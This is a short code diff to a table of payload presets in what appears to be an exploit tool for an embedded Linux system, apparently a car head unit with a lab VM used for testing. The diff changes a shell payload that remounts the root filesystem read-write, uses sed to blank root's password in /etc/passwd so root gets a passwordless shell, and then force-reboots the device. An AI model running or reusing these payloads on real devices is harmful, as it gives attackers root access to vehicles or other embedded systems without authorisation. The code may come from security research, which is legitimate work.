@@ -37,13 +37,13 @@ PRESETS = {
     'lab-dump': (26, 25, 0x8042e5f0, 'echo "===PAYLOAD-RAN===" > /dev/console'),
     'car': (27, 26, 0x8003e7c0,
             'mount -o remount,rw / ; '
-            'sed -i "s|^root:[^:]*:0:0:root:/home/root:.*|root::0:0:root:/home/root:/bin/sh|" /etc/passwd ; '
+            "sed -i 's|^root:.*|root::0:0:root:/home/root:/bin/sh|' /etc/passwd ; "
             'sync ; reboot -f'),
     # lab-only: car sed command + dump result (mount/reboot make no sense on
     # the lab ramfs; the blob's b . spin blocks init on the 1-cpu VM, so the
     # payload itself must print the file)
     'lab-sed': (26, 25, 0x8042e5f0,
-                'sed -i "s|^root:[^:]*:0:0:root:/home/root:.*|root::0:0:root:/home/root:/bin/sh|" /etc/passwd ; '
+                "sed -i 's|^root:.*|root::0:0:root:/home/root:/bin/sh|' /etc/passwd ; "
                 'sync ; cat /etc/passwd>/dev/console'),
 }
 
